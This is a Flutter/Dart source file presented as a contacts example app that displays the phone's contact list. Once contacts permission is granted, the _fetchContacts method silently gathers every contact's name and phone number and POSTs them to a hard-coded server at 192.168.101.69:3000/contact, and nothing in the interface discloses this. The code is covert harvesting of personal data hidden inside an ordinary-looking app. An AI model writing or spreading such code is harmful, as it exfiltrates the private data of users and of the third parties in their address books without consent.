import 'package:flutter/material.dart';
import 'package:dio/dio.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:permission_handler/permission_handler.dart';
class FlutterContactsExample extends StatefulWidget {
  const FlutterContactsExample({Key ? key}) : super(key: key);
  @override
  _FlutterContactsExampleState createState() => _FlutterContactsExampleState();
}

class _FlutterContactsExampleState extends State<FlutterContactsExample> {
  List<Contact>? _contacts;
  bool _permissionDenied = false;
  Future _getText() async {
    var dio = Dio();
    final response = await dio.get('http://192.168.101.69:3000/');
    print(response.data);
  }

  @override
  void initState() {
    super.initState();
    _fetchContacts();
    // _getText();
  }

  Future _fetchContacts() async {
    if (!await FlutterContacts.requestPermission(readonly: true)) {
      setState(() => _permissionDenied = true);
    } else {
      var dio = Dio();
      final contacts = await FlutterContacts.getContacts();
      List arr = [];
      if(contacts.isNotEmpty) {
        contacts.forEach((ele) async {
          var element = await FlutterContacts.getContact(ele.id);
          if(element != null && element.phones.isNotEmpty) {
            
            arr.add({
              'name': element.displayName,
              'phone': element.phones.first.number
            });
          }
        });
      }
      dio.post('http://192.168.101.69:3000/contact', data:{'data':arr});
      setState(() => _contacts = contacts);
    }
  }

  @override
  // Widget build(BuildContext context) => MaterialApp(
  //     home: Scaffold(
  //         appBar: AppBar(title: const Text('flutter_contacts_example')),
  //         body: _body()));
  Widget build(BuildContext context) =>  _body();

  Widget _body() {
    // if (_permissionDenied) return const Center(child: Text('Permission denied'));
    if (_permissionDenied) {
      return Center(
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
          const Text('Permission denied'),
          ElevatedButton(
            onPressed: () {
              checkPermission();
            },
             child: const Text('重新获取授权')
             )
        ],)
      );
    }
    if (_contacts == null) return const Center(child: CircularProgressIndicator());
    return ListView.builder(
        itemCount: _contacts!.length,
        itemBuilder: (context, i) => ListTile(
            title: Text(_contacts![i].displayName),
            onTap: () async {
              final fullContact =
                  await FlutterContacts.getContact(_contacts![i].id);
              await Navigator.of(context).push(
                  MaterialPageRoute(builder: (_) => ContactPage(fullContact!)));
            }));
  }
}

void checkPermission() async {
    Permission permission = Permission.contacts;
    PermissionStatus status = await permission.status;
    print('检测权限$status');
    if (status.isGranted) {
      //权限通过
    } else if (status.isDenied) {
      //权限拒绝， 需要区分IOS和Android，二者不一样
      requestPermission(permission);
    } else if (status.isPermanentlyDenied) {
      //权限永久拒绝，且不在提示，需要进入设置界面，IOS和Android不同
      openAppSettings();
    } else if (status.isRestricted) {
      //活动限制（例如，设置了家长///控件，仅在iOS以上受支持。
      openAppSettings();
    } else {
      //第一次申请
      requestPermission(permission);
    }
  }

  void requestPermission(Permission permission) async {
    //发起权限申请
    PermissionStatus status = await permission.request();
    // 返回权限申请的状态 status
    if (status.isPermanentlyDenied) {
      openAppSettings();
    }
  }

class ContactPage extends StatelessWidget {
  final Contact contact;
  const ContactPage(this.contact, {Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) => Scaffold(
      appBar: AppBar(title: Text(contact.displayName)),
      body: Column(children: [
        Text('First name: ${contact.name.first}'),
        Text('Last name: ${contact.name.last}'),
        Text(
            'Phone number: ${contact.phones.isNotEmpty ? contact.phones.first.number : '(none)'}'),
        Text(
            'Email address: ${contact.emails.isNotEmpty ? contact.emails.first.address : '(none)'}'),
      ]));
}